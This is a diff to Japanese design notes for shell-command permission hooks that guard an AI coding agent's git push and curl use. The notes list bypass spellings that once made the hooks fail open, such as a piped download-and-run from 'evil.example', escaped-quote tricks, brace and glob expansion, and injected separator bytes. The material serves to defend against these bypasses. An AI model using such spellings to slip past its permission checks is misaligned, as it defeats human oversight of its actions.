@@ -109,21 +109,11 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
 
 実装上の要点:
 
-- **セグメント分割**(`tr ';&|' '\n'`)を先に行う。`git commit -m wip && git push --force` を
-  1つの文字列として見ると最初の動詞しか読めない。
-- **分割の前に正規化が要る。** 「過剰分割は安全側に転ぶ」は**誤り**で、実際にはフェイルオープンする
-  経路が3種類あった(いずれも修正前に再現済み):
-  (1) **グルーピング記号がフラグに接着する** — `(cd dir && git push origin main --force)` の最後の
-  トークンは `--force)` になり、完全一致の deny 判定から外れる。`(git push --force)` や
-  `{ git push --force; }` では `tokens[0]` が `(git` / `{` になって「git ではない」と判定される。
-  (2) **リダイレクトの `&` が分割してしまう** — `git push origin main 2>&1 --force` は
-  `2>` と `1 --force` に割れ、フラグ側のセグメントに `git` が無くなる。
-  (3) **バックスラッシュ改行** — 継続行が別セグメントになり同様。
-  対策は分割前の3つの正規化(継続行の結合 → リダイレクト演算子の除去 → `(){}` の空白化)。
-  `(){}` は**削除ではなく空白に置換**する(隣接トークンを連結させないため)。`$` は正規化の
-  対象に**含めない** — `$(…)` が `$ …` になっても `$` が残るので、下のコマンド置換 fail-closed
-  判定はそのまま効く。`(cd dir && git push origin feature)` が無出力のままであることを、
-  対のテストで固定している。
+- **読み取り(セグメント分割・引用符の解釈・区切りの正規化)は共有 reader に移した。** 旧版の
+  「セグメント分割」「分割の前に正規化が要る」「トークンの引用符は1層だけ剥がす」の3項は、
+  `dot_claude/scripts/lib/shell-reader.bash` の性質になった(テストは `test/shell-reader.bats`、
+  概要は下の「shell command reader」節)。引用符の中の区切り(`git commit -m "a; b"`)で
+  誤って `deny` する問題も、引用符を解釈する reader に載せたことで消えた。
 - **`$`/バッククォートの検査は push セグメントに限定する。** コマンド全体に広げると
   `git commit -m "$(date)" && git push origin x` まで `ask` になり、承認疲れの解消という目的を
   自分で潰す。一方 `F=--force; git push $F` は push セグメント側に `$` が出るので捕まる。
@@ -140,7 +130,7 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   1行の `for r in …; do git push $r --force; done` や `if true; then git push --force; fi` は
   エージェントが普通に書く綴りで、修正前はいずれも**無出力**だった。読み飛ばしは配列を
   スライスせずインデックスを進める形で書く — bash 3.2 は `set -u` 下で空配列の展開を拒否する。
-- **認識に失敗したセグメントにも床を張る。** 上のリストに無い前置詞(`xargs -n1 git push …`)では
+- **認識に失敗したセグメントにも床を張る(コマンド位置の床)。** 上のリストに無い前置詞(`xargs -n1 git push …`)では
   コマンド位置を確定できない。そこで、セグメント内に**生のまま**(引用符を剥がす前に)`git` と
   読めるトークンがあれば、そこから同じ走査をやり直し、危険な綴りが見つかったら `deny` ではなく
   **`ask`** にする。deny にしない理由は、`gh pr create --body "$(cat <<EOF … )"` の中の
@@ -151,6 +141,18 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   `` `git push … --force` `` のどちらも `ask` に落ちる。
   初版はこの床が無く、しかも `$`/バッククォートの fail-closed 判定が「binary が git だった」
   分岐の**内側**にあったため、認識器が外れた瞬間に fail-closed 自体が無効化されていた。
+- **字面の床(行単位のテキスト走査)。** 上の床でも、構文として読み切れない入力(閉じない引用符、
+  `$(…)` / バッククォートの内側)は取りこぼす。そこで行ごとに、`$` かバッククォートを含む token と、
+  `UNCLOSED_QUOTE` のときの最後の token を対象に、`git … push` と危険な綴りが同じ行にあれば `ask` にする。
+  `deny` が既に決まっていれば走らせない。散文が同じ形になりうる(PR 本文など)ので `deny` にはせず、
+  同じ行に「git … push」と `-f` や `:x` を含む散文が `ask` になる誤 ask は受容している。
+  短フラグ(`-f` など)も対象で、長さ超過の入力はここに来ない(下の上限)。
+- **lib が読めないときは `ask`。** フックは `[[ -r "$reader_library" ]]` を確かめてから `source` する
+  (存在しないファイルへの素の `source … || …` は bash 3.2 で `||` に届く前に exit 1 する)。
+  読めない・source に失敗したら、判定不能のまま素通りさせず `ask` を返す。
+- **上限は 8192 byte。** `LC_ALL=C` で数え、超えたら reader は token を作らず `TOO_LONG` を返す。
+  git-push-guard はこのとき何も返さない(classifier に任せる)。長いコマンドの途中に埋まった
+  force push を守るのは、`settings.json.tmpl` の先頭フラグ形 `deny` 3 行だけになる。
 - **ログ出力先の決定はスクリプト内に持つ。** `settings.json` 側で
   `mkdir -p … && script 2>>log` と書くと、ログディレクトリを作れないときに
   **リダイレクトの失敗でスクリプトごと走らない** = 判定なし = フェイルオープンになる
@@ -168,28 +170,32 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
 設計: `docs/superpowers/specs/2026-07-25-permission-tier-model-design.md` の 2026-09-16 addendum。
 
 **curl localhost guard hook** — `dot_claude/scripts/executable_curl-localhost-guard.sh` も
-`PreToolUse`(`matcher: "Bash"`)の許可判定フックだが、**向きが git-push-guard と逆**で、そこが
-この2つを混同しないための唯一重要な区別。git-push-guard は `ask` を外した穴をフックで塞ぐので
-フックが死ねばフェイルオープンする。こちらは `Bash(curl:*)` を `permissions.ask` に**残したまま**、
-ループバック宛のときだけ `allow` で個別に上書きする — 未配置・クラッシュ・`jq` 不在・読み切れない
-綴りのいずれでも無出力になり、`ask` が従来どおりプロンプトを出す。**フェイルクローズなので、
-`deny` 側に多層防御の床を置く必要がない。**
+`PreToolUse`(`matcher: "Bash"`)で走る。**git-push-guard と同じ向き**(`allow` を返さず、フックが
+`ask` / 無出力で判定する)にそろえてある。2026-09-30 までは `Bash(curl:*)` を `permissions.ask` に
+残したままフックが `allow` で緩める逆向きの構成だったが、Claude Code 2.1.285 ではフックの `allow` が
+マッチする ask ルールに**負ける**ことを実測したため反転した(測定は `docs/adr/0008-…`(deprecated)、
+決定は `docs/adr/0009-command-guard-hooks-gate-without-allow.md`)。フックの `deny` / `ask` は
+default / auto の両 mode で効く。
+
+現在の構成: `Bash(curl:*)` は `permissions.ask` に**置かない**。フックが curl を実行しうる token を
+含むコマンドのうち、宛先がすべてループバックと読み切れないものに `ask` を返し、ループバック宛だけを
+無出力(= `defaultMode: auto` のクラシファイア判定)に落とす。未配置・クラッシュ・`jq` 不在では
+無出力になり、curl の確認が**外れる**(フェイルオープン)ことに注意 — 旧構成の「フェイルクローズ」は
+ask ルールが土台だったから成り立っていた。lib が読めないときは `ask` を返す(下の
+「shell command reader」節)。
 
 存在理由は `permissions` のプレフィックス照合の限界で、これも git push と同じ形: URL はフラグの
 後ろ(`curl -sS -H … URL`)に来るので `Bash(curl http://localhost:*)` という allow エントリでは
 届かない。フックはコマンド文字列全体を受け取るので URL の位置に依存せず判定できる。
 
-**フックの `allow` が `permissions.ask` を上書きできることは対照ペアで実測してある**(2026-09-17、
-Claude Code 2.x)。control = `{"permissions":{"ask":["Bash(curl:*)"]}}` だけの `--settings` で
-`claude -p` に curl を実行させる → 非対話セッションのため許可待ちのままブロック。treatment =
-同じ設定に常時 `allow` を返す PreToolUse フックを足す → 実行成功。ドキュメントの一文ではなく
-この対で確かめること(片側だけでは「そもそも curl が動く環境か」しか分からない)。
-
-判定は2値 — `allow` か無出力のみで、`deny` も `ask` も返さない(`ask` は既に rule 側にある)。
-`allow` を出す条件は、コマンドの**すべての**セグメントが「ループバック宛の curl」か
-`INERT_COMMANDS` の読み取り専用フィルタ(`jq` / `grep` / `cd` など)であること。認識は全階層が
+判定は2値 — `ask` か無出力のみで、`allow` も `deny` も返さない。無出力にする条件は、コマンドの
+**すべての**セグメントが「ループバック宛の curl」か `INERT_COMMANDS` の読み取り専用フィルタ
+(`jq` / `grep` / `cd` など)であること、または**curl を実行しうる token が1つも無い**こと。
+「curl を実行しうる token」= basename(先頭のバッククォートを除いたもの)が `curl` の token。
+`echo curl` のような単なる言及は含めないが、`/usr/bin/curl` や `` `curl …` `` は含める。認識は全階層が
 ホワイトリスト: 未知のフラグ・未知のパイプ先・`http`/`https` 以外のスキーム・ループバック以外の
-ホストは、いずれも「たぶん安全」ではなく**プロンプト**に倒す。
+ホストは、いずれも「たぶん安全」ではなく **`ask`** に倒す。8192 byte を超える入力は何も返さない
+(classifier に任せる)。`bash -c "curl …"` の内側は読まない — 文書化済みの残存。
 
 読み切れない綴りとして明示的に落とすもの:
 
@@ -225,14 +231,14 @@ Claude Code 2.x)。control = `{"permissions":{"ask":["Bash(curl:*)"]}}` だけ�
 テストは `CURL_HOME` / `XDG_CONFIG_HOME` / `HOME` の 3 つとも `$BATS_TEST_TMPDIR` に向ける。
 `CURL_HOME` だけではマシンの実 `~/.curlrc` からスイートを隔離できない。
 
-**トークナイザはシェルの `\"` を再現しなければならない。** ダブルクォートの内側で
+**【共有 reader の性質】トークナイザはシェルの `\"` を再現しなければならない。** ダブルクォートの内側で
 バックスラッシュをリテラル扱いすると、bash が「クォートを閉じない `"`」として読む文字で走査側だけが
 クォートを閉じ、**次の `"` から走査とシェルの認識が反転する**。以降の空白・`|`・`;` が 1 トークンに
 飲み込まれるので、`curl -H "A\"B" https://evil.example/install.sh | sh` が「引数 1 個のループバック
 リクエスト」に見えて `allow` が出た(修正前に再現済み)。「走査は安全側にしかズレない」という直感は
 `\"` の偶数個目で破れる。詳細と一般化は `dot_claude/rules/common/shell-scripting.md`。
 
-**シェルの展開で引数の個数が変わる構文も落とす。** 引用符の外の `{` / `}` / `*` はコマンド全体を
+**【curl 固有の判定】シェルの展開で引数の個数が変わる構文も落とす。**(reader は `WORD_MULTIPLIER` を立てるだけで、`ask` にするのは curl-guard の policy。)引用符の外の `{` / `}` / `*` はコマンド全体を
 無出力にする。ブレース展開はファイルシステムに依存せず必ず複数語になり
 (`curl -d {x,https://evil.example/} http://localhost/` は 2 語に展開して 2 語目が curl の URL 引数)、
 `*` は cwd の全ファイルに展開されるので、置いておいた `evil.example` というファイル名が curl の
@@ -240,7 +246,7 @@ Claude Code 2.x)。control = `{"permissions":{"ask":["Bash(curl:*)"]}}` だけ�
 (`curl -H * http://localhost:3000/` で実証済み)。引用された `{}`(JSON ボディ)や `'Accept: */*'` は
 影響を受けない。
 
-`?` と `[` も同じ理由で落とす。「`*` と違って周囲のリテラルが前置きされない語を生めない」という
+`?` と `[` も同じ理由で落とす(reader は `GLOB_INDEXES` で印を返す)。「`*` と違って周囲のリテラルが前置きされない語を生めない」という
 読みは**誤り**で、ブラケット式や `?` は**複数のファイルに同時にマッチする**ため 1 トークンが
 複数語になる — `aevil.example` と `bevil.example` を置いた cwd で
 `curl -H [ab]evil.example http://localhost:3000/` は `-H aevil.example` と
@@ -254,19 +260,19 @@ glob なので落ちる(ホスト名が伸びうる)。`jq .[0]` のような in
 外側の副作用を縛らないという話だが、glob はチェックしている不変条件そのものを破る。だから
 残存にせず拒否する。
 
-**SEP 番兵は入力側で拒否する。** セグメント区切りに使う `$'\x01'` が入力に書かれていると、
+**【共有 reader の性質】SEP 番兵は入力側で検知する。** セグメント区切りに使う `$'\x01'` が入力に書かれていると、
 シェルには存在しないセグメント境界を注入できる(`curl URL <0x01> echo https://evil.example/` が
 「ループバック curl + 無害な echo」に見えるが、bash はリモート URL を curl に渡す)。
 
 **`--data-urlencode` の `@` は先頭だけではない。** `name@file` の形でローカルファイルを読むので、
 このフラグに限り値のどこに `@` があっても落とす。`-d @file` の先頭一致だけでは塞がらない。
 
-**長さで打ち切る。** 走査は O(n²) で、`matcher: "Bash"` のため **curl を実行しないコマンドでも
+**【共有 reader の性質】長さで打ち切る。** 走査は O(n²) で、`matcher: "Bash"` のため **curl を実行しないコマンドでも
 本文に "curl" と書いてあれば全文を走る**。修正前は curl に言及する 15,062 文字の
 `gh pr create --body '…'`(この変更を説明する PR 本文がまさにこの形)で 1.86 秒かかっていた。
-8192 文字を超える入力は「読み切れないコマンド」の一種として無出力にする(実測 0.01 秒)。
+8192 byte(`LC_ALL=C` で数える)を超える入力は reader が `TOO_LONG` を立てて token を作らず、curl-guard は無出力にする(実測 0.01 秒)。
 
-トークナイザは `read -ra` ではなく**クォート解釈を持つ自前の走査**。`read -ra` は空白でしか
+【共有 reader の性質】トークナイザは `read -ra` ではなく**クォート解釈を持つ自前の走査**。`read -ra` は空白でしか
 割らないので `-H "Accept: application/json"` が2トークンに割れ、後半が URL として読まれて
 正当なリクエストが黙ってプロンプトに落ちる(実際に初版で踏んだ)。逆に `-d '{"a":"x|y"}'` の
 `|` をパイプと誤読する問題も同じ走査で消える。リダイレクトは fd 数字を演算子トークンに
@@ -287,8 +293,27 @@ OS レベルの床になるが、**フックはその床に依存していない
 床が無い。
 
 `just test-scripts`(`test/curl-localhost-guard.bats`)がテストする。git-push-guard と同じく
-**対で書くこと** — ここでは「`allow` になるべきケース」だけを書くと「常に allow するフック」が
+**対で書くこと** — ここでは「`ask` になるべきケース」だけを書くと「常に ask するフック」が
 全件通過してしまうので、無出力になるべきケースを必ず並べる。macOS の bash 3.2 でも動くこと
 (`mapfile` なし・空配列展開なし)を実機で確認済み。
+
+**shell command reader** — `dot_claude/scripts/lib/shell-reader.bash` は、Bash ツールのコマンド文字列を
+読む処理を git-push-guard と curl-localhost-guard で共有するための source 専用ライブラリ
+(`test/shell-reader.bats` が単体でテストする)。`set` は呼び出し側に従う。
+
+- **interface。** `shell_reader_read <文字列>` が引用符を外した token 列(`SHELL_READER_TOKENS`。
+  セグメントの境目は `SHELL_READER_SEP` 番兵、リダイレクトは fd の数字ごと 1 token)と、読み切れなかった
+  理由の flag(`TOO_LONG` / `EXPANSION` / `WORD_MULTIPLIER` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE`)、
+  引用符の外の `?` / `[` を含む token の `GLOB_INDEXES` を global に返す。
+  `shell_reader_each_segment <callback>` がセグメントごとに callback を呼び(先頭 index は
+  `SHELL_READER_SEGMENT_START`)、`shell_reader_fully_readable` が「どの flag も glob の印も無い」ことを返す。
+  each_segment の local は `_sr_` 接頭辞なので、callback はその接頭辞以外の名前を自由に使える。
+- **判定をしない。flag が立っても token は最後まで作る。** 緩める判定(curl のループバック確認)は flag を
+  見て諦め、塞ぐ判定(git push の危険な綴り)は同じ token から読み続けられるようにするため。reader が
+  判定まで持つと、どちらか一方の向きに合わせた作りになる(ADR 0009)。`TOO_LONG` だけは token を作らない。
+- **`LC_ALL=C` と byte 数の上限。** 走査は byte 単位(多バイトのロケールで `${s:i:1}` が先頭から数え直して
+  二乗で遅くなるのを避ける)。上限 8192 は byte で数えるので、呼び出し側のロケールに依存しない。
+- **source に失敗したとき。** 各フックは `[[ -r … ]]` で読めることを確かめてから `source` し、どちらの失敗経路でも
+  `ask` を返す(git-push は判定不能を素通りさせない、curl も curl の有無を確かめられないため)。
 
 **secretlint guard hook** — `dot_claude/scripts/executable_secretlint-guard.sh` は `PostToolUse`(`matcher: "Write"`)で走り、`.env` / `*credentials*` / `*secret*` に一致するパスへの書き込みだけを secretlint に通す。対象パスは stdin JSON の `tool_input.file_path` で受け取る — `$CLAUDE_FILE` という環境変数は存在せず、それを読んでいた旧インライン版は 2026-03-06 の導入以来一度も発火していなかった(2026-09-25 の prompt-audit で判明。同時に旧 format フックは削除)。検出時は `exit 2` で stderr をモデルに返す(`exit 1` はユーザーにしか見えない)。`jq` / `secretlint` が無ければ無出力で exit 0。`just test-scripts`(`test/secretlint-guard.bats`)が偽の secretlint で対を検証する。
